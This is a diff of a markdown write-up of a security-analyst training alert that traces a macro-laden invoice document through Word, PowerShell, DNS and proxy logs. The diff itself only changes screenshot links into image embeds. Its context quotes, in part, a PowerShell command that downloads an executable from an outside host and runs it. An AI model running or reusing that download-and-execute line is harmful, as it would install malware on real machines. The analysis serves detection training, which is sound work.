@@ -30,7 +30,7 @@ The alert provided the SHA256 hash for the file `edit1-invoice.docm` (`1a819d18c
 
 The VirusTotal result matched the file name and type. Verdict: Malicious.
 
-[SOC205_VirusTotal](Screenshots/SOC205_VirusTotal.png)
+![SOC205_VirusTotal](Screenshots/SOC205_VirusTotal.png)
 
 ---
 
@@ -50,7 +50,7 @@ I queried Email Security for the user `jayne` on Feb 28, 2024 to find the delive
 
 The attacker sent the `.docm` inside a password-protected zip and included the password in the email body. This is a standard evasion technique: email security gateways cannot scan the contents of an encrypted archive, so the malicious file passes through uninspected. The password in plaintext tells the recipient exactly how to open it.
 
-[SOC205_PhishingEmail](Screenshots/SOC205_PhishingEmail.png)
+![SOC205_PhishingEmail](Screenshots/SOC205_PhishingEmail.png)
 
 ---
 
@@ -60,11 +60,11 @@ Querying the EDR Endpoint Security tab for host `172.16.17.198` returned an erro
 
 The SIEM returned 17 events. The relevant logs reconstructed the full execution chain:
 
-[SOC205_ErrorEDR](ScreenshotsSOC205_ErrorEDR.png)
+![SOC205_ErrorEDR](ScreenshotsSOC205_ErrorEDR.png)
 
-[SOC205_SIEM1](Screenshots/SOC205_SIEM1.png)
+![SOC205_SIEM1](Screenshots/SOC205_SIEM1.png)
 
-[SOC205_SIEM2](Screenshots/SOC205_SIEM2.png)
+![SOC205_SIEM2](Screenshots/SOC205_SIEM2.png)
 
 **File drop**
 
@@ -74,7 +74,7 @@ Sysmon EventID 11 (File Created) at 08:41 AM `Explorer.EXE` wrote `edit1-invoice
 
 Sysmon EventID 1 (Process Create) `WINWORD.EXE` loaded the extracted `.docm` from the Downloads folder. Windows Security EventID 4688 (A New Process Has Been Created) captured the same event from a different source, confirming `WINWORD.EXE` as the parent process.
 
-[SOC205_FileDrop](Screenshots/SOC205_FileDrop.png)
+![SOC205_FileDrop](Screenshots/SOC205_FileDrop.png)
 
 **Shell spawned**
 
@@ -86,7 +86,7 @@ C:\Program Files\Microsoft Office\Office14\WINWORD.EXE /n C:\Users\admin\AppData
 
 Word spawning PowerShell is not normal behavior. This is the macro executing.
 
-[SOC205_Winword](Screenshots/SOC205_Winword.png)
+![SOC205_Winword](Screenshots/SOC205_Winword.png)
 
 **PowerShell script block**
 
@@ -98,15 +98,15 @@ POWERSHELL (NEW-OBJECT SYSTEM.NET.WEBCLIENT).DOWNLOADFILE('HTTP://WWW.GREYHATHAC
 
 The script attempts to download `messbox.exe` from the C2 server and execute it as `mess.exe`.
 
-[SOC205_PowerShell](Screenshots/SOC205_PowerShell.png)
+![SOC205_PowerShell](Screenshots/SOC205_PowerShell.png)
 
-[SOC205_4104](Screenshots/SOC205_4104.png)
+![SOC205_4104](Screenshots/SOC205_4104.png)
 
 **DNS resolution**
 
 Sysmon EventID 22 (DNS Query) at 08:42 AM confirmed `powershell.exe` queried `WWW.GREYHATHACKER.NET` and resolved it to `92.204.221.16`.
 
-[SOC205_DNS](Screenshots/SOC205_DNS.png)
+![SOC205_DNS](Screenshots/SOC205_DNS.png)
 
 **Secondary payload failure**
 
@@ -114,7 +114,7 @@ A Proxy log entry at 08:42 AM shows an outbound `GET` request from `172.16.17.19
 
 The macro executed successfully and `powershell.exe` made the outbound request, but the payload was not present on the C2 server at the time of the attack. `messbox.exe` was not downloaded.
 
-[SOC205_404](Screenshots/SOC205_404.png)
+![SOC205_404](Screenshots/SOC205_404.png)
 
 ---
 
@@ -163,7 +163,7 @@ The macro executed successfully and `powershell.exe` made the outbound request, 
 
 ---
 
-[SOC205_Score](Screenshots/SOC205_Score.png)
+![SOC205_Score](Screenshots/SOC205_Score.png)
 
 ---
 
